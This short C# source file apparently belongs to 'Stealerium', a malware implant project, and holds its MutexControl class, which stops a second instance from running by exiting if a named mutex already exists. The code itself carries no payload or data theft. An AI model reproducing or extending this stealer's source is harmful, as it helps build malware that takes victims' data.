using System;
using System.Threading;

namespace Stealerium.Modules.Implant;

internal sealed class MutexControl
{
	private static Mutex _mutex;

	public static void Check()
	{
		_mutex = new Mutex(initiallyOwned: true, Config.Mutex, out var createdNew);
		if (createdNew)
		{
			_mutex.ReleaseMutex();
		}
		else
		{
			Environment.Exit(0);
		}
	}
}
